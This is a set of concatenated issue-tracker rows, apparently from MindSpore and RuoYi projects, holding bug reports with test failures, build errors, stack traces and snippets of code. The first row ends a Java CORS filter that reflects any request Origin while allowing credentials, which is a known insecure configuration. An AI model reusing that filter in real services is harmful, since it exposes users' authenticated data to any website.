exchange.getRequest(); if (CorsUtils.isCorsRequest(request)) { HttpHeaders requestHeaders = request.getHeaders(); HttpMethod requestMethod = requestHeaders.getAccessControlRequestMethod(); ServerHttpResponse response = exchange.getResponse(); HttpHeaders headers = response.getHeaders(); headers.add(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, requestHeaders.getOrigin()); headers.addAll(HttpHeaders.ACCESS_CONTROL_ALLOW_HEADERS,requestHeaders.getAccessControlRequestHeaders()); if (requestMethod != null) { headers.add(HttpHeaders.ACCESS_CONTROL_ALLOW_METHODS, requestMethod.name()); } headers.add(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, ""true""); headers.add(HttpHeaders.ACCESS_CONTROL_EXPOSE_HEADERS, ""*""); headers.add(HttpHeaders.ACCESS_CONTROL_MAX_AGE, ""18000""); if (request.getMethod() == HttpMethod.OPTIONS) { response.setStatusCode(HttpStatus.OK); return Mono.empty(); } } return chain.filter(exchange); } @Override public int getOrder() { return Ordered.HIGHEST_PRECEDENCE; } }"
[CT][MS][igammagrada] The testcase of igammagrada operator has error on GPU.,"The testcase of igammagrada operator has error on GPU The testcase of igammagrada operator has error on GPU. 当数据类型为float64时，igammagrada 算子用例结果有误 / 硬件环境: /device ascend/GPU/ : -- MindSpore version : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph 原本交付件中的用例也没通过： run the testcase   <code>: def test_igammagrada_input_dtype_float64_1d(): input_list = [] x0 = Tensor(np.random.randn(99, ).astype(np.float64)) input_list.append(x0) x1 = Tensor(np.random.randn(99, ).astype(np.float64)) input_list.append(x1) fact = IgammaGradAMock(inputs=input_list) &gt; fact.forward_cmp() def test_igammagrada_input_dtype_float64_3d(): input_list = [] x0 = Tensor(np.random.randn(78, 40, 32).astype(np.float64)) input_list.append(x0) x1 = Tensor(np.random.randn(78, 40, 32).astype(np.float64)) input_list.append(x1) fact = IgammaGradAMock(inputs=input_list) &gt; fact.forward_cmp() def test_igammagrada_3D_fp64(): a = Tensor(np.random.rand(2, 2, 2), mstype.float64) x = Tensor(np.random.rand(2, 2, 2), mstype.float64) fact = IgammaGradAMock(inputs=[a, x]) &gt; fact.forward_cmp() def test_igammagrada_1D_4D_fp64(): a = Tensor(np.random.rand(1), mstype.float64) x = Tensor(np.random.rand(2, 2, 2, 3), mstype.float64) fact = IgammaGradAMock(inputs=[a, x]) &gt; fact.forward_cmp() def test_igammagrada_input_dtype_float64_7d(): input_list = [] x0 = Tensor(np.random.randn(6, 30, 7, 3, 4, 26, 5).astype(np.float64)) input_list.append(x0) x1 = Tensor(np.random.randn(6, 30, 7, 3, 4, 1, 5).astype(np.float64)) input_list.append(x1) fact = IgammaGradAMock(inputs=input_list) &gt; fact.forward_cmp() test_igammagrada.py:236: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/igammagrada_ops.py:45: in forward_cmp allclose_nparray(out_tf, out_mindspore, self.loss, self.loss) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[[[-5.53103801e-01, -6.69433407e-01, -1.32995416e+00, nan, -2.41589540e-05], ..., [ nan, nan, -5.82028118e-02, -4.30300123e-01, -7.02926589e-01]]]]]]]) data_me = array([[[[[[[0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.], ...,... ..., [0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.]]]]]]]) rtol = 0.001, atol = 0.001, equal_nan = True def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): &gt; assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) E AssertionError def test_igammagrada_1D_4D_fp64(): a = Tensor(np.random.rand(1), mstype.float64) x = Tensor(np.random.rand(2, 2, 2, 3), mstype.float64) fact = IgammaGradAMock(inputs=[a, x]) &gt; fact.forward_cmp() test_igammagrada.py:37: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/igammagrada_ops.py:52: in forward_cmp allclose_nparray(out_tf, out_mindspore, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-0.71914174, -0.61780348, -0.57844467], [-0.51458524, -0.75613367, -0.45520691]], [[-0.451... -0.79963552]], [[-0.50071334, -0.72734734, -0.80829223], [-0.43826726, -0.48818999, -0.68485389]]]]) data_me = array([[[[-4.18203569e-07, -4.47937906e-07, -3.20548269e-06], [-2.40032039e-02, -7.41313546e-02, -7.77340572e... [[ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]]]]) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-0.71914174 -0.61780348 -0.57844467 -0.51458524 -0.75613367 -0.45520691 E -0.45160082 -0.44624658 -0.52142628 -0.47216121 -0.67691235 -0.75742174 E -0.45595052 -0.39617017 -0.76928935 -0.66357354 -0.68522381 -0.79963552 E -0.50071334 -0.72734734 -0.80829223 -0.43826726 -0.48818999 -0.68485389] E data_me_error:[-4.18203569e-07 -4.47937906e-07 -3.20548269e-06 -2.40032039e-02 E -7.41313546e-02 -7.77340572e-06 -1.39345284e-02 -6.29017477e-04 E -7.33397769e-07 -2.13690661e-02 -8.39581916e-05 -4.32191370e-07 E 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 E 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 E 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00] E loss:[0.71914133 0.61780303 0.57844147 0.49058204 0.68200232 0.45519914 E 0.43766629 0.44561757 0.52142554 0.45079214 0.67682839 0.7574213 E 0.45595052 0.39617017 0.76928935 0.66357354 0.68522381 0.79963552 E 0.50071334 0.72734734 0.80829223 0.43826726 0.48818999 0.68485389]"
Build mindspore lite failed after setting android-ndk,": /device cpu : -- MindSpore version : master build from source -- Python version : 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : 7.3.0 Git clone MindSpore master. Download android ndk and uzip it. Export ANDROID_NDK. bash build.sh -T on -e cpu -I arm64 -j64 Build succeed.   <code>: CMake Error at /usr/local/share/cmake-3.18/Modules/CMakeTestCCompiler.cmake:66 (message): The C compiler ""/root/android-ndk-r22b/toolchains/llvm/prebuilt/linux-x86_64/bin/clang"" is not able to compile a simple test program. It fails with the following output: Change Dir: /data1/xtc/repository/xiaotianci/mindspore/mindspore/lite/build/_deps/flatbuffers-src/_build/CMakeFiles/CMakeTmp Run Build Command(s):/usr/bin/gmake cmTC_92d7a/fast &amp;&amp; /usr/bin/gmake -f CMakeFiles/cmTC_92d7a.dir/build.make CMakeFiles/cmTC_92d7a.dir/build gmake[1]: Entering directory `/data1/xtc/repository/xiaotianci/mindspore/mindspore/lite/build/_deps/flatbuffers-src/_build/CMakeFiles/CMakeTmp' Building C object CMakeFiles/cmTC_92d7a.dir/testCCompiler.c.o /root/android-ndk-r22b/toolchains/llvm/prebuilt/linux-x86_64/bin/clang -D_FORTIFY_SOURCE=2 -O2 -o CMakeFiles/cmTC_92d7a.dir/testCCompiler.c.o -c /data1/xtc/repository/xiaotianci/mindspore/mindspore/lite/build/_deps/flatbuffers-src/_build/CMakeFiles/CMakeTmp/testCCompiler.c Linking C executable cmTC_92d7a /usr/local/bin/cmake -E cmake_link_script CMakeFiles/cmTC_92d7a.dir/link.txt --verbose=1 /root/android-ndk-r22b/toolchains/llvm/prebuilt/linux-x86_64/bin/clang -D_FORTIFY_SOURCE=2 -O2 -rdynamic CMakeFiles/cmTC_92d7a.dir/testCCompiler.c.o -o cmTC_92d7a ld: error: unable to find library -lcompiler_rt-extras ld: error: unable to find library -lgcc_s ld: error: unable to find library -lgcc_s ld: error: cannot open crtend.o: No such file or directory clang: error: linker command failed with exit code 1 (use -v to see invocation) gmake[1]: *** [cmTC_92d7a] Error 1 gmake[1]: Leaving directory `/data1/xtc/repository/xiaotianci/mindspore/mindspore/lite/build/_deps/flatbuffers-src/_build/CMakeFiles/CMakeTmp' gmake: *** [cmTC_92d7a/fast] Error 2"
在启动ruoyi时出现JWT strings must contain exactly 2 period characters. Found: 0的错误,"前端错误如下： 后端报错如下：   <code>: 10:32:32.388 [http-nio-9200-exec-8] ERROR c.r.c.s.h.GlobalExceptionHandler - [handleRuntimeException,82] - 请求地址'/logout',发生未知异常. io.jsonwebtoken.MalformedJwtException: JWT strings must contain exactly 2 period characters. Found: 0 at io.jsonwebtoken.impl.DefaultJwtParser.parse(DefaultJwtParser.java:235) at io.jsonwebtoken.impl.DefaultJwtParser.parse(DefaultJwtParser.java:481) at io.jsonwebtoken.impl.DefaultJwtParser.parseClaimsJws(DefaultJwtParser.java:541) at com.ruoyi.common.core.utils.JwtUtils.parseToken(JwtUtils.java:40) at com.ruoyi.common.core.utils.JwtUtils.getUserName(JwtUtils.java:97) at com.ruoyi.auth.controller.TokenController.logout(TokenController.java:49) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1070) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doDelete(FrameworkServlet.java:931) at javax.servlet.http.HttpServlet.service(HttpServlet.java:687) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96)"
IsNan算子反向微分时返回类型为非Tensor,": /device gpu /device cpu   <code>: import mindspore import mindspore.nn as nn import mindspore.numpy as mnp import mindspore.ops as ops from mindspore.common import Tensor class GradNet(nn.Cell): def __init__(self): super(GradNet, self).__init__() self.grad_op = ops.GradOperation() def construct(self, x, y): return self.grad_op(mnp.maximum)(x, y) x1 = Tensor(1.0) x3 = Tensor(2.0) grad_net = GradNet() print(grad_net(x1, x2))"
[CT][MS][Atanh] 性能测试用例中，标杆TensorFlow提示：list index out of range,"1， 在GPU环境，执行性能测试用例，标杆TensorFlow提示：IndexError: list index out of range / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: Doc: op: The nodes are operation kernel type, such as MatMul, Conv2D. Graph nodes belonging to the same type are aggregated together. requested bytes: The memory requested by the operation, accumulatively. total execution time: Sum of accelerator execution time and cpu execution time. cpu execution time: The time from the start to the end of the operation. It's the sum of actual cpu run time plus the time that it spends waiting if part of computation is launched asynchronously. accelerator execution time: Time spent executing on the accelerator. This is normally measured by the actual hardware library. Profile: node name | requested bytes | total execution time | accelerator execution time | cpu execution time Atanh 268.80KB (100.00%, 100.00%), 4.04ms (100.00%, 93.07%), 0us (0.00%, 0.00%), 4.04ms (100.00%, 93.07%) VarHandleOp 0B (0.00%, 0.00%), 153us (6.93%, 3.52%), 0us (0.00%, 0.00%), 153us (6.93%, 3.52%) ReadVariableOp 0B (0.00%, 0.00%), 123us (3.41%, 2.83%), 0us (0.00%, 0.00%), 123us (3.41%, 2.83%) _retval_Atanh_0_0 0B (0.00%, 0.00%), 25us (0.58%, 0.58%), 0us (0.00%, 0.00%), 25us (0.58%, 0.58%) AssignVariableOp 0B (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%) Const 0B (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%) NoOp 0B (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%) VarIsInitializedOp 0B (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%), 0us (0.00%, 0.00%) ======================End of Report========================== def test_atanh_12x10x14x8_fp16_profiler(): input_x = Tensor(np.random.randn(12, 10, 14, 8).astype(np.float16)) fact = AtanhMock(inputs=[input_x]) &gt; fact.forward_profile_cmp() test_atanh.py:475: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/atanh_ops.py:97: in forward_profile_cmp forward_profile_tf = self.tensorflow_forward_profile(net_tf, run_time, op_name_tf, *inputs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = AtanhMock&lt;&gt;, net = &lt;function atanh at 0x7fbe4235cb90&gt;, run_time = 10, op_name = 'name: ""Atanh""' inputs = (array([[[[ 1.5039e+00, 1.2344e+00, -2.1465e+00, ..., -8.0322e-01, -9.2676e-01, 8.0762e-01], [-1.... [-1.4590e+00, 1.1602e+00, -4.6240e-01, ..., -1.5254e+00, 1.2490e+00, -6.2695e-01]]]], dtype=float16),) kwargs = {}, graph = &lt;tensorflow.python.framework.ops.Graph object at 0x7fbe17e866d0&gt;, tf_args = [&lt;tf.Variable 'Variable:0' shape=(12, 10, 14, 8) dtype=float16&gt;] out = &lt;tf.Tensor 'Atanh:0' shape=(12, 10, 14, 8) dtype=float16&gt;, inits = &lt;tf.Operation 'init' type=NoOp&gt;, config = , sess = &lt;tensorflow.python.client.session.Session object at 0x7fbe1d3c7b50&gt; profiler = &lt;tensorflow.python.profiler.model_analyzer.Profiler object at 0x7fbf5161c090&gt; run_meta = step_stats { dev_stats { device: ""/job:localhost/replica:0/task:0/device:CPU:0"" node_stats { node_name...299 op_end_rel_nanos: 1591 all_end_rel_nanos: 1915 scheduled_nanos: -3885008766975672440 } } } def tensorflow_forward_profile(self, net, run_time, op_name, *inputs, **kwargs): ''' profiler forward for tensorflow :param net: the tensorflow net :param run_time: the times for running :param op_name: the op name in tensorflow node :param inputs: the inputs :return: the profiler data ''' graph = tf.Graph() with graph.as_default(): tf_args = [tf.Variable(arg) for arg in inputs] for arg_key, arg_value in kwargs.items(): kwargs[arg_key] = tf.Variable(arg_value) out = net(*tf_args, **kwargs) inits = tf.compat.v1.global_variables_initializer() config = tf.compat.v1.ConfigProto() with tf.compat.v1.Session(config=config) as sess: profiler = tf.compat.v1.profiler.Profiler(sess.graph) sess.run(inits) run_meta = tf.compat.v1.RunMetadata() option = tf.compat.v1.RunOptions(trace_level=tf.compat.v1.RunOptions.FULL_TRACE) for _ in range(run_time): sess.run(out, options=option, run_metadata=run_meta) profiler.add_step(0, run_meta) profileoptionbuilder = tf.compat.v1.profiler.ProfileOptionBuilder opts = profileoptionbuilder.time_and_memory(min_micros=0, min_bytes=0) logger.info( ""tensorflow profiler: {}"".format(profiler.profile_operations(options=opts))) if 'CONTEXT_DEVICE_TARGET' in os.environ and os.environ[ 'CONTEXT_DEVICE_TARGET'].upper() == 'GPU': forward_profile_tf = float( str(profiler.profile_operations(options=opts)).split(op_name)[ &gt; 2].split('accelerator_exec_micros')[1].split()[1]) / run_time E IndexError: list index out of range"
项目部署问题,"Application Version: 4.2.0 Spring Boot Version: 2.1.1.RELEASE //////////////////////////////////////////////////////////////////// // <em>ooOoo</em> // // o8888888o // // 88"" . ""88 // // (| ^_^ |) // // O\ = /O // // <em><em>/. // // / \||| : |||// \ // // / <em>||||| -:- |||||- \ // // | | \\ - /// | | // // | _| ''---/'' | | // // \ .-_</em> <em>/-. / // // <em>. . ___ // // ."""" '&lt; - `.;;. : | | // // \ \ / / // // ========-.</em>_</em></em>/</em>.-=---=' // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// 14:31:37.277 [main] INFO c.r.RuoYiServletInitializer - [logStarting,50] - Starting RuoYiServletInitializer on LAPTOP-50IFLM3Q with PID 18744 (D:\apache-tomcat-9.0.29\webapps\ruoyi-admin\WEB-INF\classes started by think in D:\apache-tomcat-9.0.29\bin) 14:31:37.289 [main] DEBUG c.r.RuoYiServletInitializer - [logStarting,53] - Running with Spring Boot v2.1.1.RELEASE, Spring v5.1.3.RELEASE 14:31:37.294 [main] INFO c.r.RuoYiServletInitializer - [logStartupProfileInfo,679] - The following profiles are active: druid 14:31:42.152 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,158] - Cache with name 'com.ruoyi.framework.shiro.realm.UserRealm.authorizationCache' does not yet exist. Creating now. 14:31:42.153 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,165] - Added EhCache named [com.ruoyi.framework.shiro.realm.UserRealm.authorizationCache] 14:31:44.440 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [loginRecordCache] 14:31:45.368 [main] INFO c.a.d.p.DruidDataSource - [init,991] - {dataSource-1} inited 14:31:45.376 [main] DEBUG c.r.s.m.S.selectConfigList - [debug,159] - ==&gt; Preparing: select config_id, config_name, config_key, config_value, config_type, create_by, create_time, update_by, update_time, remark from sys_config 14:31:45.413 [main] DEBUG c.r.s.m.S.selectConfigList - [debug,159] - ==&gt; Parameters: 14:31:45.445 [main] DEBUG c.r.s.m.S.selectConfigList - [debug,159] - &lt;== Total: 4 14:31:45.453 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-config] 14:31:45.462 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-config] 14:31:45.463 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-config] 14:31:45.465 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-config] 14:31:46.148 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-userCache] 14:31:46.150 [main] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-userCache] 14:31:46.790 [main] WARN o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext - [refresh,554] - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'formContentFilter' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]: Factory method 'formContentFilter' threw exception; nested exception is java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException 14:31:46.799 [main] INFO c.a.d.p.DruidDataSource - [close,1928] - {dataSource-1} closed 14:31:46.834 [main] ERROR o.s.b.SpringApplication - [reportFailure,858] - Application run failed org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'formContentFilter' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]: Factory method 'formContentFilter' threw exception; nested exception is java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:157) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:540) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:775) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) at org.springframework.boot.web.servlet.support.SpringBootServletInitializer.run(SpringBootServletInitializer.java:157) at org.springframework.boot.web.servlet.support.SpringBootServletInitializer.createRootApplicationContext(SpringBootServletInitializer.java:137) at org.springframework.boot.web.servlet.support.SpringBootServletInitializer.onStartup(SpringBootServletInitializer.java:91) at org.springframework.web.SpringServletContainerInitializer.onStartup(SpringServletContainerInitializer.java:171) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5135) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:717) at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:690) at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:705) at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:978) at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1849) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75) at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:112) at org.apache.catalina.startup.HostConfig.deployWARs(HostConfig.java:773) at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:427) at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1576) at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:309) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123) at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423) at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366) at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:936) at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:841) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1384) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1374) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75) at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:134) at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:909) at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:262) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.StandardService.startInternal(StandardService.java:421) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:930) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.startup.Catalina.start(Catalina.java:633) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:343) at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:474) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'formContentFilter' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]: Factory method 'formContentFilter' threw exception; nested exception is java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:627) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:456) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1288) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1127) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:538) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.getOrderedBeansOfType(ServletContextInitializerBeans.java:235) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.addAsRegistrationBean(ServletContextInitializerBeans.java:193) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.addAsRegistrationBean(ServletContextInitializerBeans.java:188) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.addAdaptableBeans(ServletContextInitializerBeans.java:170) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.(ServletContextInitializerBeans.java:89) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.getServletContextInitializerBeans(ServletWebServerApplicationContext.java:261) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.selfInitialize(ServletWebServerApplicationContext.java:234) at 